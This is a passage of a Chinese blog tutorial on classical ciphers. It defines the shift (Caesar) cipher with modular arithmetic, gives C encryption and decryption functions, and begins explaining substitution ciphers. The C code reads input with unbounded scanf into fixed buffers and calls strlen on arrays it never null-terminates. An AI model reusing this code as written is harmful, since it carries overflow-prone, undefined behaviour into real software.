style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span></span></span></span>均满足对于任意<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>∈</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">x∈P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span></span></span></span>,有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>d</mi><mi>k</mi></msub><mo stretchy="false">(</mo><msub><mi>e</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>=</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">d_k(e_k(x))=x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span></span></span></span>。</p>
<hr />
<h2 id="移位密码"><a class="markdownIt-Anchor" href="#移位密码"></a> 移位密码</h2>
<h3 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h3>
<p>移位密码的基础是数论中的模运算。基本定义为</p>
<ul>
<li>
<p>假设a和b均为整数，m是一正整数。若 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mi mathvariant="normal">∣</mi><mi>b</mi><mo>−</mo><mi>a</mi></mrow><annotation encoding="application/x-tex">m | b-a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord">∣</span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span>，则可将其表示为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mo>≡</mo><mi>b</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a≡b(mod\,m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">b</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">m</span><span class="mclose">)</span></span></span></span>，式 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mo>≡</mo><mi>b</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext>  </mtext><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a≡b(mod\;m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">b</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">m</span><span class="mclose">)</span></span></span></span>，正整数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span></span></span></span>称为模数。</p>
</li>
<li>
<p>接下来的移位密码基于模26所得的完全剩余系进行实现。</p>
</li>
</ul>
<h3 id="密码体制"><a class="markdownIt-Anchor" href="#密码体制"></a> 密码体制</h3>
<p>令<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo>=</mo><mi>C</mi><mo>=</mo><mi>K</mi><mo>=</mo><msub><mi>Z</mi><mn>26</mn></msub></mrow><annotation encoding="application/x-tex">P=C=K=Z_{26}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。对于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn><mo>≤</mo><mi>K</mi><mo>≤</mo><mn>25</mn></mrow><annotation encoding="application/x-tex">0\leq K\leq 25</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.13597em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">5</span></span></span></span>，任意<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo>∈</mo><msub><mi>Z</mi><mn>26</mn></msub></mrow><annotation encoding="application/x-tex">x,y\in Z_{26}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，定义：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>e</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mi>K</mi><mo stretchy="false">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext>  </mtext><mn>26</mn></mrow><annotation encoding="application/x-tex">e_k(x)=(x+K)mod\;26</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mclose">)</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">2</span><span class="mord">6</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>d</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>y</mi><mo>−</mo><mi>K</mi><mo stretchy="false">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext>  </mtext><mn>26</mn></mrow><annotation encoding="application/x-tex">d_k(y)=(y-K)mod\;26</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mclose">)</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">2</span><span class="mord">6</span></span></span></span>。当<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>K</mi><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">K=3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span></span></span></span>时此密码称为凯撒密码。26个英文字符分别对应<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>Z</mi><mn>26</mn></msub></mrow><annotation encoding="application/x-tex">Z_{26}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>中的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn><mo>−</mo><mn>25</mn></mrow><annotation encoding="application/x-tex">0-25</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">5</span></span></span></span>。</p>
<p>加密过程为首先将明文转化为对应的整数串，再根据<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span></span></span></span>的值对整数串进行移位处理，最后将处理后的整数串转化为密文对应的英文字符即可。</p>
<h3 id="代码实现"><a class="markdownIt-Anchor" href="#代码实现"></a> 代码实现</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Shift_E</span><span class="params">()</span>    <span class="comment">//加密实现</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> p[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> k;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入明文串：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入移位密钥：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;k);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(p);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((p[i]&gt;=<span class="string">&#x27;A&#x27;</span>)&amp;&amp;(p[i]&lt;=<span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            c[i]=((p[i]-<span class="string">&#x27;A&#x27;</span>)+k)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>((p[i]&gt;=<span class="string">&#x27;a&#x27;</span>)&amp;&amp;(p[i]&lt;=<span class="string">&#x27;z&#x27;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            c[i]=((p[i]-<span class="string">&#x27;a&#x27;</span>)+k)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(c);i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,c[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Shift_D</span><span class="params">()</span>    <span class="comment">//解密实现</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">char</span> p[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> k;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入密文串：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入移位密钥：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;k);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((c[i]&gt;=<span class="string">&#x27;A&#x27;</span>)&amp;&amp;(c[i]&lt;=<span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">            p[i]=((c[i]-<span class="string">&#x27;A&#x27;</span>)-k+<span class="number">26</span>)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;<span class="comment">//加上26以解决模的结果为负的情况</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>((c[i]&gt;=<span class="string">&#x27;a&#x27;</span>)&amp;&amp;(c[i]&lt;=<span class="string">&#x27;z&#x27;</span>))</span><br><span class="line">            p[i]=((c[i]-<span class="string">&#x27;a&#x27;</span>)-k+<span class="number">26</span>)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(p);i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,p[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实例实现效果如下：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210417185750.png" alt="alt 移位密码实现" /></p>
<h2 id="代换密码"><a class="markdownIt-Anchor" href="#代换密码"></a> 代换密码</h2>
<h3 id="介绍-2"><a class="markdownIt-Anchor" href="#介绍-2"></a> 介绍</h3>
<ul>
<li>
<p>移位密码是代换密码的一种特殊情况，其只是包含了<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>26</mn><mo stretchy="false">!</mo><mtext>  </mtext></mrow><annotation encoding="application/x-tex">26!\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>置换中的26种情况，下面的代换密码可以理解为任一明文字符对应另一密文字符，故存在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>26</mn><mo stretchy="false">!</mo><mtext>  </mtext></mrow><annotation encoding="application/x-tex">26!\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>种情况。</p>
</li>
<li>
<p>加密函数对应一种置换  <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>π</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\pi\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">π</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>，而解密函数是对应的逆置换。</p>
</li>
</ul>
<h3 id="密码体制-2"><a class="markdownIt-Anchor" href="#密码体制-2"></a> 密码体制</h3>
<ul>
<li>令<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo>=</mo><mi>C</mi><mo>=</mo><msub><mi>Z</mi><mn>26</mn></msub></mrow><annotation encoding="application/x-tex">P=C=Z_{26}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span></span></span></span>是由<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>26</mn></mrow><annotation encoding="application/x-tex">26</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">6</span></span></span></span>个数字<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn><mo separator="true">,</mo><mn>1...</mn><mo separator="true">,</mo><mn>25</mn></mrow><annotation encoding="application/x-tex">0,1...,25</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mord">5</span></span></span></span>的所有可能的置换组成。对任意的置换<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>π</mi><mo>∈</mo><mi>K</mi></mrow><annotation encoding="application/x-tex">\pi\in K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">π</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span></span></span></span>，定义：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>e</mi><mi>π</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>π</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e_{\pi}(x)=\pi(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">π</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">π</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>d</mi><mi>π</mi></msub><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>π</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">d_{\pi}(y)=\pi^{-1}(y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">π</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span>，这里<span class="katex"><span 